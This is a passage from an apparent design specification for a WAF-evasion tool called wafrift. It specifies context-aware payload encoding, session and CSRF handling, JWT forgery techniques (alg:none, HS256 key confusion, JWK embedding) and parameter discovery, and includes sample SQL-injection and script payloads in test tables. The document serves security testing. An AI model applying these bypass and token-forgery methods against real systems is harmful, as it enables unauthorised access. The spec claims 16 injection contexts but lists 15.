# Full Technical Specification: Features 1–6

**Version:** 1.0  
**Status:** Draft — ready for implementation  
**Scope:** Context-aware encoding, session/state handling, parameter discovery, OOB confirmation, modern format support, and explanation engine.

---

## 1. Testing Philosophy & Standards

### 1.1 Coverage Gates
- **New code:** Minimum 90% line coverage (measured via `tarpaulin` or `llvm-cov`).
- **Modified existing code:** Minimum 85% line coverage.
- **CI gate:** Build fails if coverage drops below threshold.

### 1.2 Test Categories (mandatory for every feature)
| Category | Requirement |
|----------|-------------|
| **Unit tests** | Every public function must have at least one positive and one negative test case. |
| **Property tests** | Every pure function must have at least one `proptest` invariant. Minimum 10,000 iterations in CI. |
| **Fuzz tests** | Every parser/serializer/deserializer must survive 1M `cargo fuzz` iterations without panics or memory leaks. |
| **E2E tests** | Every feature must have at least one Wiremock-based end-to-end test exercising the full stack. |
| **Adversarial tests** | Every security-relevant path must have tests for: malformed input, boundary conditions (empty, max-length), resource exhaustion, injection attempts in metadata. |
| **Concurrency tests** | All shared/mutable state must have stress tests (either `loom` model-checking or 100+ concurrent tokio tasks). |
| **Snapshot tests** | All CLI text/markdown output must use `insta` snapshot tests for regression detection. |
| **Performance tests** | Every feature must include a `criterion` benchmark. CI fails if regression exceeds 5% vs. baseline. |
| **Round-trip tests** | Every serializer must have a round-trip test: `deserialize(serialize(x)) == x`. |

### 1.3 Test Data Requirements
- All test payloads must be drawn from or compatible with the `wafrift-bench/corpus` (557 cases, 10 attack classes).
- Mock WAF rules for E2E tests must be version-controlled in `rules/test/`.
- Every E2E test must use a unique TCP port to avoid cross-test contamination.

### 1.4 Defect Classification
| Severity | Definition | Response |
|----------|-----------|----------|
| **Critical** | Memory safety violation, SSRF allowlist bypass, host isolation failure, gene bank corruption. | Block release. |
| **High** | Incorrect bypass verdict, session leak between hosts, OOB canary collision. | Block release. |
| **Medium** | Performance regression >5%, missing test coverage, config parsing crash. | Fix before merge. |
| **Low** | Typo in explanation text, missing doc comment, snapshot drift. | Fix in next patch. |

---

## 2. Feature 1: Context-Aware Encoding

### 2.1 Motivation
Current encoding applies transforms blindly. A JSON-escaped `"` or an XML `&` can corrupt the request structure before the WAF even sees it. Context-aware encoding guarantees that the bypassed payload remains structurally valid in its destination context.

### 2.2 Requirements
| ID | Requirement | Priority |
|----|-------------|----------|
| F1-R1 | Support 16 injection contexts (see 2.3.1). | Must |
| F1-R2 | Encoding strategies must produce structurally valid output for the given context. | Must |
| F1-R3 | If a strategy cannot be applied in a context, the system must gracefully degrade (skip variant, do not fail scan). | Must |
| F1-R4 | Performance overhead of context awareness must be <5% vs. generic encoding at P95 latency. | Must |
| F1-R5 | Backward compatibility: existing `--level heavy` must produce identical output when no context is provided. | Must |
| F1-R6 | Context must be auto-detectable from Content-Type header + parameter location. | Should |

### 2.3 Data Model

#### 2.3.1 `InjectionContext`
New file: `crates/types/src/injection_context.rs`

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum InjectionContext {
    JsonString,        // Inside a JSON string value: "PAYLOAD"
    JsonNumber,        // Inside a JSON number literal: 123
    XmlAttribute,      // Inside XML tag attribute: <foo bar="PAYLOAD">
    XmlCdata,          // Inside <![CDATA[ ... ]]>
    XmlText,           // Between XML tags: <foo>PAYLOAD</foo>
    HtmlAttribute,     // Inside HTML attribute: <div class="PAYLOAD">
    HtmlText,          // Between HTML tags: <div>PAYLOAD</div>
    UrlQuery,          // URL-encoded query parameter
    UrlPath,           // URL path segment
    UrlFragment,       // URL fragment
    HeaderValue,       // HTTP header value (after the colon)
    CookieValue,       // Cookie value (after =, before ;)
    MultipartField,    // multipart/form-data field value
    MultipartFileName, // filename="..." in multipart
    PlainBody,         // Raw body with no structural context
}
```

**Constraints:**
- `PlainBody` is the default when context is unknown.
- The enum is `#[non_exhaustive]` to allow future contexts without breaking downstream.

#### 2.3.2 `ContextualEncodeError`
New file: `crates/types/src/error.rs` (extend existing)

```rust
#[derive(Debug, Error, Serialize, Deserialize, Clone, PartialEq)]
pub enum ContextualEncodeError {
    #[error("strategy {strategy:?} produced output incompatible with context {context:?}: {reason}")]
    ContextIncompatible {
        strategy: String,
        context: InjectionContext,
        reason: String,
    },
    #[error("payload contains invalid UTF-8 at byte offset {offset}")]
    InvalidUtf8 { offset: usize },
    #[error("payload exceeds maximum size for context {context:?}: {size} bytes (max {max})")]
    PayloadTooLarge {
        context: InjectionContext,
        size: usize,
        max: usize,
    },
    #[error("contextual escaping failed: {0}")]
    EscapeFailed(String),
}
```

**Max size per context:**
| Context | Max Payload Size |
|---------|-----------------|
| JsonString | 4 MiB |
| JsonNumber | 1 KiB |
| XmlAttribute | 1 MiB |
| XmlCdata | 8 MiB |
| HeaderValue | 8 KiB |
| CookieValue | 4 KiB |
| MultipartFileName | 256 bytes |
| All others | 8 MiB |

### 2.4 API Specification

#### 2.4.1 `encode_in_context`
**Location:** `crates/encoding/src/contextual.rs`  
**Signature:**
```rust
pub fn encode_in_context(
    payload: &[u8],
    strategy: Strategy,
    context: InjectionContext,
) -> Result<String, ContextualEncodeError>;
```

**Preconditions:**
- `payload` is non-empty.
- `strategy` is a valid encoding strategy (not `Strategy::Auto`).

**Postconditions:**
- On `Ok(s)`: `s` is a valid UTF-8 string that is structurally valid in `context`.
- On `Err(ContextIncompatible)`: the strategy output cannot be made valid in this context.

**Algorithm (pseudocode):**
```
1. If payload.len() > max_size_for(context):
     return Err(PayloadTooLarge)

2. base = strategy.encode(payload)?
   // If strategy.encode fails, map to InvalidUtf8 or propagate

3. escaped = match context:
     JsonString:
       a. Verify base is valid UTF-8.
       b. Replace \ with \\
       c. Replace " with \"
       d. Replace control chars (0x00-0x1F) with \u00XX hex escape
       e. If base contains bare surrogates (U+D800-U+DFFF), escape as \uXXXX
       f. If strategy produced Unicode escapes (\uXXXX), verify no collision with step 3d.
          If collision: re-escape the backslash in the strategy output.
       g. Return escaped string.

     JsonNumber:
       a. If base contains any non-digit, non-dot, non-minus, non-e, non-E, non-plus char:
          return Err(ContextIncompatible { reason: "not a valid JSON number" })
       b. Return base (no additional escaping needed)

     XmlAttribute:
       a. Replace & with &amp;
       b. Replace " with &quot;
       c. Replace < with &lt;
       d. Replace > with &gt;
       e. If base contains \x00, return Err(ContextIncompatible)
       f. Return escaped string

     XmlCdata:
       a. If base contains "]]>" (the CDATA terminator sequence):
          return Err(ContextIncompatible { reason: "CDATA cannot contain ]]>" })
       b. Return base unchanged (CDATA is raw text)

     XmlText:
       a. Replace & with &amp;
       b. Replace < with &lt;
       c. Replace > with &gt;
       d. Return escaped string

     HtmlAttribute:
       a. Replace & with &amp;
       b. Replace " with &quot;
       c. Replace ' with &#x27;
       d. Replace < with &lt;
       e. Return escaped string
       // Note: we escape BOTH quote types because we don't know the attribute delimiter.

     HtmlText:
       a. Replace & with &amp;
       b. Replace < with &lt;
       c. Return escaped string

     UrlQuery:
       a. If strategy is Strategy::UrlEncode or Strategy::DoubleUrlEncode:
          return base unchanged (URL encoding IS the escaping)
       b. Else: percent-encode all non-unreserved chars per RFC 3986
       c. Return encoded string

     UrlPath:
       a. Same as UrlQuery, but / is NOT encoded unless it appears in the payload itself
       b. Return encoded string

     UrlFragment:
       a. Percent-encode all non-unreserved chars
       b. Return encoded string

     HeaderValue:
       a. If base contains \r or \n (CR or LF):
          return Err(ContextIncompatible { reason: "CR/LF in header value" })
       b. If base contains \x00:
          return Err(ContextIncompatible { reason: "null byte in header value" })
       c. Return base unchanged

     CookieValue:
       a. Replace ; with %3B
       b. Replace = with %3D
       c. Replace \x00 with %00
       d. Return escaped string

     MultipartField:
       a. If base contains \r or \n:
          return Err(ContextIncompatible { reason: "CR/LF would break multipart structure" })
       b. Return base unchanged

     MultipartFileName:
       a. If base contains ":
          return Err(ContextIncompatible { reason: "quote in filename" })
       b. If base contains \r or \n:
          return Err(ContextIncompatible { reason: "CR/LF in filename" })
       c. Return base unchanged

     PlainBody:
       a. Return base unchanged

4. Validate the escaped output with context-specific validator (see 2.4.3).
5. Return Ok(escaped).
```

#### 2.4.2 `escape_for_context`
**Location:** `crates/encoding/src/contextual.rs`  
**Signature:**
```rust
pub fn escape_for_context(
    input: &str,
    context: InjectionContext,
) -> Result<String, ContextualEncodeError>;
```

**Purpose:** Pure escaping without applying an encoding strategy first. Used when the caller already has the bypassed bytes and just needs them escaped for the context.

**Behavior:** Steps 3–5 of `encode_in_context`, applied directly to `input`.

#### 2.4.3 `validate_in_context`
**Location:** `crates/encoding/src/contextual.rs`  
**Signature:**
```rust
pub fn validate_in_context(
    payload: &str,
    context: InjectionContext,
) -> Result<(), ContextualEncodeError>;
```

**Behavior:** Runs the structural validation rules from step 3 above but does not modify the payload. Returns `Ok(())` if valid, `Err` with specific reason if invalid.

**Validation rules per context:**
| Context | Invalid If Contains |
|---------|---------------------|
| JsonString | Unescaped `"`, unescaped `\`, bare control chars |
| JsonNumber | Any char not in `[0-9.-eE+]` |
| XmlAttribute | Unescaped `&`, `<`, `>`, `"`, `\x00` |
| XmlCdata | `]]>` |
| XmlText | Unescaped `&`, `<`, `>` |
| HtmlAttribute | Unescaped `&`, `<`, `"`, `'` |
| HtmlText | Unescaped `&`, `<` |
| UrlQuery | Unencoded spaces (should be `%20` or `+`) |
| HeaderValue | `\r`, `\n`, `\x00` |
| CookieValue | Unescaped `;`, `=`, `\x00` |
| MultipartField | `\r`, `\n` |
| MultipartFileName | `\r`, `\n`, `"` |

### 2.5 Integration Points

#### 2.5.1 `EvasionPipeline`
**File:** `crates/strategy/src/pipeline.rs`  
**Change:** `EvasionPipeline` must accept `Option<InjectionContext>` per stage.

```rust
pub struct EvasionStage {
    pub technique: Technique,
    pub context: Option<InjectionContext>,  // NEW FIELD
}
```

**Behavior:**
- If `context` is `Some(ctx)`:
  - For `Technique::PayloadEncoding(s)`: call `encoding::contextual::encode_in_context(payload, s, ctx)`
  - On `ContextIncompatible`: skip this stage, record skip in `EvasionResult::skipped_stages`
- If `context` is `None`: preserve existing behavior (call `encoding::encode(payload, s)`)

#### 2.5.2 `evade()` and `evade_smart()`
**File:** `crates/strategy/src/strategy.rs`  
**Change:** Add `context: Option<InjectionContext>` parameter.

```rust
pub fn evade(
    payload: &[u8],
    level: EscalationLevel,
    config: &EvasionConfig,
    context: Option<InjectionContext>,  // NEW
) -> Vec<EvasionResult>;
```

**Backward compatibility:** Existing callers that don't pass context will use `None`, producing identical output.

#### 2.5.3 CLI Integration
**File:** `crates/cli/src/scan/mod.rs`  
**New flags:**
```
--context <CONTEXT>           Manual context override (json-string, xml-attr, etc.)
--auto-context                Auto-detect from Content-Type and parameter location
```

**Auto-detection logic:**
| Content-Type | Parameter Location | Detected Context |
|-------------|-------------------|------------------|
| `application/json` | Body | `JsonString` (if param type is string) or `JsonNumber` (if integer) |
| `application/xml` | Body | `XmlText` |
| `text/html` | Body | `HtmlText` |
| `multipart/form-data` | Body | `MultipartField` |
| `multipart/form-data` | File upload | `MultipartFileName` |
| Any | Query | `UrlQuery` |
| Any | Path | `UrlPath` |
| Any | Header | `HeaderValue` |
| Any | Cookie | `CookieValue` |

#### 2.5.4 Proxy Integration
**File:** `crates/proxy/src/main.rs`  
**Behavior:** When proxy processes a request:
1. Inspect `Content-Type` header.
2. Inspect where the payload is injected (query string, body, header).
3. Derive `InjectionContext` using the same logic as CLI auto-detection.
4. Pass context to `evade_smart()`.

### 2.6 Error Handling
- `ContextIncompatible`: Pipeline skips the variant. `tracing::debug!("skipping incompatible variant: {}", err)`.
- `PayloadTooLarge`: Pipeline skips the variant. `tracing::warn!`.
- `InvalidUtf8`: Pipeline skips the variant. `tracing::debug!`.
- `EscapeFailed`: Treated as internal bug. `tracing::error!` + panic in debug builds.

### 2.7 Configuration
```toml
[context]
auto_detect = true
default = "PlainBody"
strict = false   # If true, ContextIncompatible variants are errors instead of skips
```

### 2.8 Testing Specification

#### 2.8.1 Unit Tests (minimum 80 test cases)
**File:** `crates/encoding/tests/contextual.rs`

| Test Name | Input | Context | Strategy | Expected |
|-----------|-------|---------|----------|----------|
| `json_string_basic` | `hello` | `JsonString` | `UnicodeEscape` | `"\\u0068\\u0065\\u006c\\u006c\\u006f"` |
| `json_string_with_quotes` | `" OR 1=1` | `JsonString` | `Plain` | `"\" OR 1=1"` |
| `json_string_backslash_collision` | `\` | `JsonString` | `UnicodeEscape` | Verify `\u005c` not `\\u005c` |
| `json_number_valid` | `123` | `JsonNumber` | `Plain` | `123` |
| `json_number_invalid` | `abc` | `JsonNumber` | `Plain` | `Err(ContextIncompatible)` |
| `xml_attribute_basic` | `<script>` | `XmlAttribute` | `Plain` | `&lt;script&gt;` |
| `xml_cdata_terminator` | `]]>` | `XmlCdata` | `Plain` | `Err(ContextIncompatible)` |
| `html_attribute_quotes` | `"x"` | `HtmlAttribute` | `Plain` | `&quot;x&quot;` |
| `header_value_cr` | `a\rb` | `HeaderValue` | `Plain` | `Err(ContextIncompatible)` |
| `cookie_value_semicolon` | `a;b` | `CookieValue` | `Plain` | `a%3Bb` |
| `multipart_field_crlf` | `a\r\nb` | `MultipartField` | `Plain` | `Err(ContextIncompatible)` |
| `url_query_percent` | `a b` | `UrlQuery` | `Plain` | `a%20b` |
| `url_query_strategy_is_url_encode` | `a b` | `UrlQuery` | `UrlEncode` | `a%20b` (no double encoding) |

**Plus:** Test every strategy (35+) against `PlainBody` to ensure backward compatibility.

#### 2.8.2 Property Tests
**File:** `crates/encoding/tests/property_contextual.rs`

**Invariant 1 — Round-trip:**
```rust
proptest!(|(payload in "[ -~]{1,256}", strategy in arb_strategy(), context in arb_context())| {
    let encoded = encode_in_context(payload.as_bytes(), strategy, context)?;
    let decoded = context_unescape(&encoded, context)?;
    prop_assert_eq!(decoded, payload);
});
```

**Invariant 2 — Validation never fails after encoding:**
```rust
proptest!(|(payload in arb_payload(), strategy in arb_strategy(), context in arb_context())| {
    if let Ok(encoded) = encode_in_context(&payload, strategy, context) {
        prop_assert!(validate_in_context(&encoded, context).is_ok());
    }
});
```

**Invariant 3 — PlainBody equivalence:**
```rust
proptest!(|(payload in arb_payload(), strategy in arb_strategy())| {
    let generic = encode(&payload, strategy)?;
    let contextual = encode_in_context(&payload, strategy, PlainBody)?;
    prop_assert_eq!(generic, contextual);
});
```

#### 2.8.3 Adversarial Tests
**File:** `crates/encoding/tests/adversarial_contextual.rs`

| Test | Input | Context | Expected |
|------|-------|---------|----------|
| `null_byte_json_string` | `\x00` | `JsonString` | `\u0000` (escaped, not rejected) |
| `unicode_rtl_html_attr` | `\u202e` | `HtmlAttribute` | Escaped or preserved, does not break attribute |
| `eight_mb_payload_cookie` | 8 MiB of 'A' | `CookieValue` | `Err(PayloadTooLarge)` |
| `empty_payload` | `""` | `JsonString` | `""` (empty JSON string) |
| `max_size_boundary` | exactly max_size bytes | `JsonString` | Ok |
| `max_size_plus_one` | max_size + 1 bytes | `JsonString` | `Err(PayloadTooLarge)` |
| `nested_escape_collision` | `\\u0022` | `JsonString` | No double-escaping |

#### 2.8.4 E2E Tests
**File:** `crates/cli/tests/e2e_contextual.rs`

**Test 1: JSON body bypass**
- Mock server accepts JSON POST `{"query": "..."}`
- Mock WAF blocks `" UNION SELECT` in JSON body
- Run: `wafrift scan --target http://localhost:PORT --payload "' UNION SELECT 1--" --context json-string`
- Assert: At least one bypass variant received HTTP 200
- Assert: Bypass variant is valid JSON (can be parsed by `serde_json`)

**Test 2: XML attribute bypass**
- Mock server accepts XML POST `<search query="..."/>`
- Mock WAF blocks `<script>` in XML attributes
- Run: `wafrift scan ... --context xml-attribute`
- Assert: Bypass variant is well-formed XML

#### 2.8.5 Performance Tests
**File:** `crates/encoding/benches/contextual.rs`

Benchmark: `encode()` vs. `encode_in_context()` for all 35+ strategies, corpus payloads.
- Baseline: generic encoding median latency
- Target: contextual encoding P95 latency ≤ 1.05 × baseline
- CI gate: Criterion regression check, threshold 5%

#### 2.8.6 Fuzz Tests
**File:** `crates/encoding/fuzz/fuzz_contextual.rs`

Input: random bytes (0–8 MiB) + random strategy + random context  
Invariant: Must not panic. Must return `Ok` or `Err`, never `unwrap` panic.  
Duration: 1M iterations minimum.

---

## 3. Feature 2: Session & State Handling

### 3.1 Motivation
Current `EvasionClient` is stateless. Real applications require sessions, CSRF tokens, and JWTs. Without session handling, every scan starts cold and cannot bypass WAFs that enforce session validation or CSRF checks.

### 3.2 Requirements
| ID | Requirement | Priority |
|----|-------------|----------|
| F2-R1 | Cookie jar persistence per target host, with disk serialization. | Must |
| F2-R2 | Automatic CSRF token extraction from response bodies and injection into mutating requests. | Must |
| F2-R3 | JWT manipulation: `alg:none`, HS256 confusion, JWK embedding. | Must |
| F2-R4 | Session state must be isolated per host — no cookie/auth leakage between targets. | Must |
| F2-R5 | Cookie jar must support FIFO eviction under memory pressure (aligned with existing 10,000-host cap). | Must |
| F2-R6 | JWT signing keys must never be written to logs or gene banks. | Must |
| F2-R7 | Session file permissions must be `0o600` (user read-write only). | Must |
| F2-R8 | Backward compatibility: `EvasionClient::new()` must behave exactly as before. | Must |

### 3.3 Data Model

#### 3.3.1 `SessionConfig`
New file: `crates/types/src/session.rs`

```rust
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct SessionConfig {
    /// Path to Netscape/Mozilla format cookie jar file.
    /// If the file does not exist, an empty jar is created.
    pub cookie_jar_path: Option<PathBuf>,

    /// Regex with exactly one capture group to extract CSRF token from HTML response body.
    /// Example: r#"<meta name="csrf-token" content="([^"]+)""#
    pub csrf_extract_regex: Option<String>,

    /// Where to inject the extracted CSRF token.
    pub csrf_injection: CsrfInjectionLocation,

    /// Static authorization header added to every request.
    /// Format: "Header-Name: value"
    pub auth_header: Option<String>,

    /// JWT manipulation to apply to Bearer tokens found in requests or responses.
    pub jwt_manipulation: Option<JwtManipulation>,

    /// Signing key for JWT manipulations that require HMAC.
    /// Must be base64-encoded.
    pub jwt_signing_key: Option<String>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
pub enum CsrfInjectionLocation {
    #[default]
    Header,       // X-CSRF-Token: <value>
    Query,        // Appended to query string: ?csrf_token=<value>
    Body,         // Appended to form body: csrf_token=<value>
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum JwtManipulation {
    /// Set alg to "none" and remove signature.
    StripAlg,
    /// Change alg to "HS256" and re-sign with symmetric key.
    Hs256WithKey,
    /// Embed a JWK public key in the header.
    JwkEmbed { jwk: String },
}
```

**Constraints:**
- `jwt_signing_key` is redacted in `Debug` output after the first 4 chars: `"abcd****"`.
- `SessionConfig` must implement `ZeroizeOnDrop` for `jwt_signing_key` (or explicit zeroization).

#### 3.3.2 `SessionState` (internal)
New file: `crates/transport/src/session.rs`

```rust
pub struct SessionState {
    pub jar: CookieJar,                    // reqwest::cookie::Jar
    pub csrf_regex: Option<Regex>,
    pub csrf_injection: CsrfInjectionLocation,
    pub auth_header: Option<(String, String)>,  // (name, value)
    pub jwt_config: Option<JwtConfig>,
    pub last_persist: Instant,
}

pub struct JwtConfig {
    pub manipulation: JwtManipulation,
    pub signing_key: Vec<u8>,  // decoded from base64
}
```

**Security constraints:**
- `JwtConfig` must implement `ZeroizeOnDrop`.
- `SessionState` must be behind an `Arc<Mutex<...>>` in `EvasionClient`.
- Cookie jar must be per-host: `HashMap<String, SessionState>`.

### 3.4 API Specification

#### 3.4.1 `EvasionClient::with_session`
**Location:** `crates/transport/src/client.rs`  
**Signature:**
```rust
impl EvasionClient {
    pub fn with_session(config: SessionConfig) -> Result<Self, EvasionError>;
}
```

**Preconditions:**
- If `cookie_jar_path` is `Some(path)`, the parent directory must exist or be creatable.
- If `csrf_extract_regex` is `Some(re)`, it must be a valid regex with exactly one capture group.
- If `jwt_signing_key` is `Some(key)`, it must be valid base64.

**Postconditions:**
- Returns `Ok(client)` with session-enabled transport.
- If `cookie_jar_path` exists, jar is loaded from disk.
- If `cookie_jar_path` does not exist, empty jar is created and file will be written on first persist.

**Algorithm:**
```
1. Build base reqwest::ClientBuilder with cookie_provider enabled.
2. If cookie_jar_path provided:
   a. If file exists: load cookies via load_jar()
   b. Else: create empty jar
3. If csrf_extract_regex provided:
   a. Compile regex
   b. Verify regex has exactly one capture group (test against "csrf-token-content")
   c. If no capture group: return Err(EvasionError::InvalidCsrfRegex)
4. If auth_header provided:
   a. Parse "Name: Value" format
   b. If parsing fails: return Err(EvasionError::InvalidAuthHeader)
5. If jwt_manipulation provided:
   a. If manipulation is Hs256WithKey and jwt_signing_key is None:
      return Err(EvasionError::MissingJwtKey)
   b. Decode signing_key from base64
   c. Wrap in JwtConfig with ZeroizeOnDrop
6. Store SessionState in client
7. Return client
```

#### 3.4.2 `session::extract_csrf`
**Location:** `crates/transport/src/session.rs`  
**Signature:**
```rust
pub fn extract_csrf(response_body: &str, regex: &Regex) -> Result<String, SessionError>;
```

**Preconditions:**
- `regex` has exactly one capture group.

**Postconditions:**
- Returns `Ok(token)` if regex matches and capture group is non-empty.
- Returns `Err(CsrfTokenNotFound)` if no match or empty capture.

**Algorithm:**
```
1. Find first match of regex in response_body.
2. If no match: return Err(CsrfTokenNotFound)
3. Extract capture group 1.
4. If capture is empty: return Err(CsrfTokenNotFound)
5. Return Ok(capture.to_string())
```

#### 3.4.3 `session::inject_csrf`
**Location:** `crates/transport/src/session.rs`  
**Signature:**
```rust
pub fn inject_csrf(
    request: &mut Request,
    token: &str,
    location: CsrfInjectionLocation,
);
```

**Behavior:**
- `Header`: Add header `X-CSRF-Token: {token}`
- `Query`: Append `csrf_token={percent_encode(token)}` to URL query string
- `Body`: If content-type is `application/x-www-form-urlencoded`, append `&csrf_token={token}`. If `multipart/form-data`, add text field. Otherwise: `tracing::warn!` and skip.

#### 3.4.4 `jwt::manipulate`
**Location:** `crates/transport/src/jwt.rs`  
**Signature:**
```rust
pub fn manipulate(token: &str, manipulation: &JwtManipulation, key: Option<&[u8]>) -> Result<String, JwtError>;
```

**Preconditions:**
- `token` is a valid JWT (three base64url segments separated by `.`).
- If `manipulation` is `Hs256WithKey`, `key` must be `Some`.

**Postconditions:**
- Returns manipulated JWT string.
- Never panics on malformed input.

**Algorithm for `StripAlg`:**
```
1. Split token by '.' into [header_b64, payload_b64, signature_b64].
2. If length != 3: return Err(InvalidToken)
3. Decode header_b64 from base64url.
4. Parse header as JSON.
5. Set "alg" to "none".
6. Remove "signature" or "jwk" if present (optional hardening).
7. Re-encode header to base64url.
8. Return "{new_header}.{payload_b64}." (empty signature).
```

**Algorithm for `Hs256WithKey`:**
```
1. Split token by '.'.
2. Decode header.
3. Set "alg" to "HS256".
4. Remove "jwk", "x5c", "kid" to prevent key confusion defense.
5. Re-encode header.
6. Compute HMAC-SHA256(key, "{new_header}.{payload_b64}") → signature.
7. Base64url-encode signature.
8. Return "{new_header}.{payload_b64}.{new_signature}".
```

**Algorithm for `JwkEmbed`:**
```
1. Split token by '.'.
2. Decode header.
3. Add "jwk": <provided JWK JSON> to header.
4. Keep original "alg".
5. Re-encode header.
6. If original alg was RS256 and we have the private key: re-sign. Otherwise return token with embedded JWK (for alg confusion attacks where backend trusts embedded JWK).
```

#### 3.4.5 `session::load_jar` / `session::save_jar`
**Location:** `crates/transport/src/session.rs`

```rust
pub fn load_jar(path: &Path) -> Result<CookieJar, SessionError>;
pub fn save_jar(jar: &CookieJar, path: &Path) -> Result<(), SessionError>;
```

**Format:** Netscape/Mozilla cookie jar text format.
**Permissions:** File created with mode `0o600`.
**Atomicity:** Write to temp file → fsync → rename.

### 3.5 Integration Points

#### 3.5.1 `EvasionClient::send()` modification
**File:** `crates/transport/src/client.rs`

**Modified algorithm:**
```
1. Lookup or create HostState for target host.
2. If session config exists:
   a. Load cookies for this host from jar and add to request.
   b. If auth_header configured: add to request headers.
   c. If request method is POST/PUT/PATCH/DELETE AND csrf_regex configured:
      i. Send GET to base URL first.
      ii. Extract CSRF token from response body.
      iii. Inject token into main request.
   d. If jwt_manipulation configured AND request has Authorization: Bearer header:
      i. Extract token from header.
      ii. Call jwt::manipulate().
      iii. Replace header with manipulated token.
3. Call evade() / evade_smart() with request.
4. Send via reqwest.
5. On response:
   a. Update cookie jar with Set-Cookie headers.
   b. Record response in HostState.
6. Debounced persist: if last_persist > 5 seconds ago, save jar to disk.
```

#### 3.5.2 `HostState` extension
**File:** `crates/strategy/src/host_state/mod.rs`

Add `session: Option<SessionState>` field.  
When `HostState` is evicted from the FIFO queue, the session must be persisted to disk immediately (if `cookie_jar_path` is configured).

#### 3.5.3 CLI Integration
**New flags:**
```
--session-jar <PATH>
--csrf-regex <REGEX>
--csrf-injection <header|query|body>
--auth-header <HEADER>
--jwt-manipulation <strip-alg|hs256|jwk-embed>
--jwt-key <BASE64_KEY>
```

### 3.6 Error Handling
- `SessionError::CookieJarCorrupt { path, line }` — jar file exists but line N is malformed.
- `SessionError::CsrfRegexInvalid { regex, reason }` — regex compilation failed or no capture group.
- `SessionError::CsrfTokenNotFound { url }` — GET succeeded but token extraction failed.
- `SessionError::AuthHeaderInvalid { header }` — does not contain `:`.
- `JwtError::InvalidToken { reason }` — not a valid JWT.
- `JwtError::MissingKey` — Hs256WithKey requested but no key provided.
- `JwtError::UnsupportedAlgorithm { alg }` — original alg is "none" and Hs256WithKey requested.

### 3.7 Configuration
```toml
[session]
cookie_jar = "~/.wafrift/sessions/target.jar"
csrf_regex = '<meta name="csrf-token" content="([^"]+)"'
csrf_injection = "header"
auth_header = "Authorization: Bearer eyJ..."
jwt_manipulation = "strip_alg"
jwt_key = "c2VjcmV0LWtleQ=="
```

### 3.8 Testing Specification

#### 3.8.1 Unit Tests
**File:** `crates/transport/tests/session.rs`

| Test | Setup | Action | Expected |
|------|-------|--------|----------|
| `load_empty_jar` | Empty file | `load_jar` | Empty jar, no error |
| `load_malformed_jar` | File with invalid line | `load_jar` | `CookieJarCorrupt` with line number |
| `save_jar_permissions` | Valid jar | `save_jar` | File mode is `0o600` |
| `extract_csrf_meta_tag` | HTML with meta csrf-token | `extract_csrf` | Returns token value |
| `extract_csrf_no_match` | HTML without token | `extract_csrf` | `CsrfTokenNotFound` |
| `extract_csrf_empty_capture` | `<meta content="">` | `extract_csrf` | `CsrfTokenNotFound` |
| `jwt_strip_alg` | Valid RS256 JWT | `manipulate(StripAlg)` | Header alg="none", no signature |
| `jwt_hs256_resign` | Valid JWT + key | `manipulate(Hs256WithKey, key)` | alg="HS256", valid HMAC |
| `jwt_invalid_token` | `not.a.jwt` | `manipulate` | `InvalidToken` |
| `jwt_unsupported_alg_none` | alg="none" JWT | `manipulate(Hs256WithKey)` | `UnsupportedAlgorithm` |

#### 3.8.2 Property Tests
**File:** `crates/transport/tests/property_session.rs`

**Invariant 1:** `load_jar(save_jar(jar)) == jar` for any valid jar.

**Invariant 2:** `manipulate(token, StripAlg)` → decode header → `alg == "none"`.

**Invariant 3:** `manipulate(token, Hs256WithKey, key)` → verify HMAC with same key → success.

#### 3.8.3 E2E Tests
**File:** `crates/cli/tests/e2e_session.rs`

**Test 1: Cookie replay**
- Wiremock: GET `/login` returns `Set-Cookie: session=abc123`; POST `/action` requires `Cookie: session=abc123`.
- Run: `wafrift scan --target ... --session-jar test.jar`
- Assert: POST request includes `Cookie: session=abc123`.

**Test 2: CSRF flow**
- Wiremock: GET `/form` returns `<meta name="csrf" content="tok123">`; POST `/submit` requires `X-CSRF-Token: tok123`.
- Run: `wafrift scan ... --csrf-regex '<meta name="csrf" content="([^"]+)"'`
- Assert: POST includes `X-CSRF-Token: tok123`.

**Test 3: JWT bypass**
- Wiremock: POST `/api` validates JWT signature with RS256 public key. Also accepts `alg:none`.
- Run: `wafrift scan ... --jwt-manipulation strip_alg`
- Assert: Request includes manipulated JWT, server returns 200.

#### 3.8.4 Concurrency Tests
**File:** `crates/transport/tests/concurrency_session.rs`

- Spawn 100 tokio tasks, each sending a request through the same `EvasionClient` with shared cookie jar.
- Assert: No panics, no data races (run under `loom` if possible, otherwise `miri`).
- Assert: Cookie jar state is consistent after all tasks complete.

#### 3.8.5 Security Tests
**File:** `crates/transport/tests/security_session.rs`

| Test | Action | Expected |
|------|--------|----------|
| `host_isolation_cookies` | Client scans host-a then host-b | host-b request does NOT include host-a's cookies |
| `host_isolation_auth` | Same as above | host-b does NOT include host-a's auth header |
| `jwt_key_not_logged` | Enable tracing at DEBUG level | JWT key does not appear in logs |
| `jwt_key_zeroized` | Drop JwtConfig | Key bytes are zeroed in memory |
| `jar_file_permissions` | Create new jar | File mode is exactly `0o600` |

---

## 4. Feature 3: Parameter Discovery

### 4.1 Motivation
Current `wafrift scan` requires the user to specify `--param` manually. Parameter discovery automates the identification of injection points from API specifications and hidden parameter mining.

### 4.2 Requirements
| ID | Requirement | Priority |
|----|-------------|----------|
| F3-R1 | Parse OpenAPI 2.0 and 3.0/3.1 specs into `DiscoveredEndpoint` structs. | Must |
| F3-R2 | Execute GraphQL introspection queries to discover mutations and fields. | Must |
| F3-R3 | Mine hidden parameters via differential response analysis with configurable wordlist. | Must |
| F3-R4 | Output must be pipeable: `wafrift discover | wafrift scan --from-discovery -` | Must |
| F3-R5 | Auto-detect `InjectionContext` from parameter type + content-type. | Must |
| F3-R6 | Respect rate limits during discovery (configurable delay between requests). | Should |
| F3-R7 | Support discovery from HAR files. | Should |

### 4.3 Data Model

#### 4.3.1 `DiscoveredEndpoint`
New file: `crates/types/src/discovery.rs`

```rust
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct DiscoveredEndpoint {
    pub url: String,
    pub method: Method,
    pub injection_points: Vec<InjectionPoint>,
    pub source: DiscoverySource,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct InjectionPoint {
    pub name: String,
